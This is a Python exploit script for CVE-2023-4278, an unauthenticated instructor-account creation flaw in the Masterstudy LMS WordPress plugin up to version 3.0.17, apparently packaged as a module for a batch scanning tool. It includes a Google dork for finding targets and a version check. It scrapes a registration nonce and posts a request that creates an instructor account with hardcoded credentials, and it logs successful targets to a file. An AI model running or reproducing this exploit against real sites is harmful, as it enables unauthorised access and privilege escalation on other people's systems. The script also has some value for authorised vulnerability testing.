# Exploit Title:  Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation
# Google Dork: inurl:/user-public-account
# Date: 2023-09-04
# Exploit Author: Revan Arifio
# Vendor Homepage: https:/.org/plugins/masterstudy-lms-learning-management-system/
# Version: <= 3.0.17
# Tested on: Windows, Linux
# CVE : CVE-2023-4278

import requests
import re
import time
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

banner = """
   _______      ________    ___   ___ ___  ____        _  _ ___ ______ ___  
  / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \      | || |__ \____  / _ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) | __) |_____| || |_ ) |  / / (_) |
 | |      \ \/ / |  __|______/ /| | | |/ / |__ <______|__   _/ /  / / > _ < 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |        | |/ /_ / / | (_) |
  \_____|   \/   |______|  |____|\___/____|____/         |_|____/_/   \___/ 

======================================================================================================
|| Title            : Masterstudy LMS <= 3.0.17 - Unauthenticated Instructor Account Creation       ||
|| Author           : https://github.com/revan-ar                                                   ||
|| Vendor Homepage  : https:/wordpress.org/plugins/masterstudy-lms-learning-management-system/      ||
|| Support          : https://www.buymeacoffee.com/revan.ar                                         ||
======================================================================================================
"""

class Cve_2023_4278:
    def get_nonce(self,target):
        open_target = requests.get("{}/user-public-account".format(target),verify=self.ssl,headers=self.headers,proxies=self.proxy)
        search_nonce = re.search('"stm_lms_register":"(.*?)"', open_target.text)
        if search_nonce[1] != None:
            return search_nonce[1]
        else:
            if not self.batch:
                OutPrintInfo("Wordpress","Failed when getting Nonce :p")

    # privielege escalation
    def privesc(self,target, nonce, username, password, email):
        req_data = {
            "user_login": "{}".format(username),
            "user_email": "{}".format(email),
            "user_password": "{}".format(password),
            "user_password_re": "{}".format(password),
            "become_instructor": True,
            "privacy_policy": True,
            "degree": "",
            "expertize": "",
            "auditory": "",
            "additional": [],
            "additional_instructors": [],
            "profile_default_fields_for_register": [],
            "redirect_page": "{}/user-account/".format(target)
        }

        start = requests.post("{}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce={}".format(target, nonce),
                              json=req_data,verify=self.ssl,headers=self.headers,proxies=self.proxy)

        if start.status_code == 200:
            OutPrintInfoSuc("Wordpress",f"Exploit Success {target}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce={nonce}")
            if self.batch:
                with open("./result/wordpress_2023_4278.txt","a") as w:
                    w.write(f"{target}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce={nonce}\n")
        else:
            if not self.batch:
                OutPrintInfo("Wordpress","Exploit Failed :p")
    def main(self,targets):
        self.batch = targets["batch_work"]
        target = targets["url"].strip('/ ')
        self.ssl = targets["ssl"]
        header = targets["header"]
        proxy = targets["proxy"]

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)

        if not self.batch:
            print(banner)
        if not self.batch:
            OutPrintInfo("Wordpress","Starting Exploit")
        try:
            plugin_check = requests.get(
                f"{target}/wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt",verify=self.ssl,headers=self.headers,proxies=self.proxy)
            plugin_version = re.search("Stable tag: (.+)", plugin_check.text)
            int_version = plugin_version[1].replace(".", "")
            time.sleep(1)

            if int(int_version) < 3018:
                if not self.batch:
                    OutPrintInfoSuc("Wordpress", "Target is Vulnerable !!")
                # Credential
                email = "admin@adgamil.com"
                username = "admintests"
                password = "admintest8"
                time.sleep(1)
                OutPrintInfo("Wordpress", "Getting Nonce...")

                get_nonce = self.get_nonce(target)
                # Get Nonce
                if get_nonce != None:
                    if not self.batch:
                        OutPrintInfo("Wordpress", f"Success Getting Nonce: {get_nonce}")

                    time.sleep(1)
                    # Start PrivEsc
                    self.privesc(target, get_nonce, username, password, email)
                # ----------------------------------

            else:
                if not self.batch:
                    OutPrintInfo("Wordpress","Target is NOT Vulnerable :p")
        except Exception:
            if not self.batch:
                OutPrintInfo("Wordpress", "Target request error :p")

